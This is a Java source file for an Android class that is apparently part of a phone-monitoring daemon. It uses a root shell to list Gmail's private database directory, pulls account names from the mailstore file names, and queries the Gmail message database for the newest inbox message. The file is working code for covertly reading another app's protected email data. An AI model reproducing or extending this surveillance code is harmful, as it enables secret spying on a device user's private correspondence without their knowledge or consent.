package com.vvt.daemon.email;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.StringReader;
import java.util.HashSet;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;

import com.vvt.logger.FxLog;
import com.vvt.shell.CannotGetRootShellException;
import com.vvt.shell.Shell;

public class GmailDatabaseManager {

	private static final String TAG = "GmailDatabaseManager";
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGW = Customization.WARNING;
	private static final boolean LOGE = Customization.ERROR;
	
	// Account databases are located separately
	// e.g. /data/data/com.google.android.providers.gmail/databases/mailstore.droidfx1@gmail.com.db
	public static HashSet<String> getGmailAccount() {
		if(LOGV) FxLog.v(TAG, "getGmailAccount # ENTER ...");
		HashSet<String> accounts = new HashSet<String>();
		
		try {
			String gmailPath = GmailDatabaseHelper.getGmailDbPath();
			Shell shell = Shell.getRootShell();
			String list = shell.exec(String.format("/system/bin/ls %s", gmailPath));
			shell.terminate();
			
			if (list == null || list.contains("No such file or directory")) {
				if(LOGD) FxLog.d(TAG, "getGmailAccount # Gmail accounts not found!!");
			}
			else {
				BufferedReader reader = new BufferedReader(new StringReader(list), 256);
				String line = null;
				String account = null;
				
				String regex = "(mailstore){1}(.)*(.db){1}";
				Pattern p = Pattern.compile(regex);
				Matcher m = null;
				
				while ((line = reader.readLine()) != null) {
					m = p.matcher(line);
					if (m.find()) {
						int start = m.start();
						int end = m.end();
						account = line.substring(start+10, end-3);
						accounts.add(account);
						
						if(LOGV) FxLog.v(TAG, String.format("getGmailAccount # Found: %s", account));
					}
				}
			}
		}
		catch (CannotGetRootShellException e) {
			if(LOGE) FxLog.e(TAG, null, e);
		} catch (IOException e) {
			if(LOGE) FxLog.e(TAG, null, e);
		}
		
		if(LOGD) FxLog.d(TAG, String.format("getGmailAccount # Summary: %s", accounts));
		
		if(LOGV) FxLog.v(TAG, "getGmailAccount # EXIT ...");

		return accounts;
	}
	
	public static long getMessageLatestId(String account) {
		if(LOGV) FxLog.v(TAG, "getMessageLatestId # ENTER ...");
		
		SQLiteDatabase db = GmailDatabaseHelper.getReadableDatabase(account);
		if (db == null || db.isDbLockedByCurrentThread() || db.isDbLockedByOtherThreads()) {
			if(LOGW) FxLog.w(TAG, "getMessageLatestId # Open database FAILED!! -> EXIT ...");
			if (db != null) {
				db.close();
			}
			return -1;
		}
		
		String sqlGetAll = String.format(
				"SELECT %s.%s AS mid, %s.%s AS m_label_id,* FROM %s " +
				"LEFT JOIN %s ON %s = %s " +
				"LEFT JOIN %s ON %s = %s.%s " +
				"WHERE (%s = '%s' OR %s = '%s') AND %s = 1 AND %s = 0 " +
				"ORDER BY %s DESC",
				GmailDatabaseHelper.TABLE_MESSAGES, GmailDatabaseHelper.COLUMN_ID,
				GmailDatabaseHelper.TABLE_MESSAGE_LABELS,GmailDatabaseHelper.COLUMN_ID,
				GmailDatabaseHelper.TABLE_MESSAGES, 
				GmailDatabaseHelper.TABLE_MESSAGE_LABELS, 
				GmailDatabaseHelper.COLUMN_MSG_ID, GmailDatabaseHelper.COLUMN_MSG_MSG_ID, 
				GmailDatabaseHelper.TABLE_LABELS, GmailDatabaseHelper.COLUMN_LABELS_ID, 
				GmailDatabaseHelper.TABLE_LABELS, GmailDatabaseHelper.COLUMN_ID, 
				GmailDatabaseHelper.COLUMN_NAME, "^i", 
				GmailDatabaseHelper.COLUMN_NAME, "^f",
				GmailDatabaseHelper.COLUMN_SYNCED, GmailDatabaseHelper.COLUMN_CLIENT_CREATED,
				"m_label_id");
		
		String sqlGetMaxId = String.format("SELECT MAX(%s) AS refId FROM (%s) ", "m_label_id", sqlGetAll);

//		// select max(messages._id) from messages)
//		String sql = String.format("SELECT MAX(%s) FROM %s WHERE %s = 1", 
//				GmailDatabaseHelper.COLUMN_ID, GmailDatabaseHelper.TABLE_MESSAGES, GmailDatabaseHelper.COLUMN_SYNCED);
		
		Cursor cursor = db.rawQuery(sqlGetMaxId, null);
		
		if (cursor == null || cursor.getCount() == 0) {
			if(LOGW) FxLog.w(TAG, "getMessageLatestId # Query database FAILED!! -> EXIT ...");
			if (cursor != null) {
				cursor.close();
			}
			db.close();
			return -1;
		}
		
		long id = -1;
		
		if (cursor.moveToNext()) {
			id = cursor.getLong(0);
		}
		
		cursor.close();
		db.close();
		
		if(LOGV) FxLog.v(TAG, String.format("getMessageLatestId # account: %s, id: %d", account, id));
		if(LOGV) FxLog.v(TAG, "getMessageLatestId # EXIT ...");
		
		return id;
	}

}
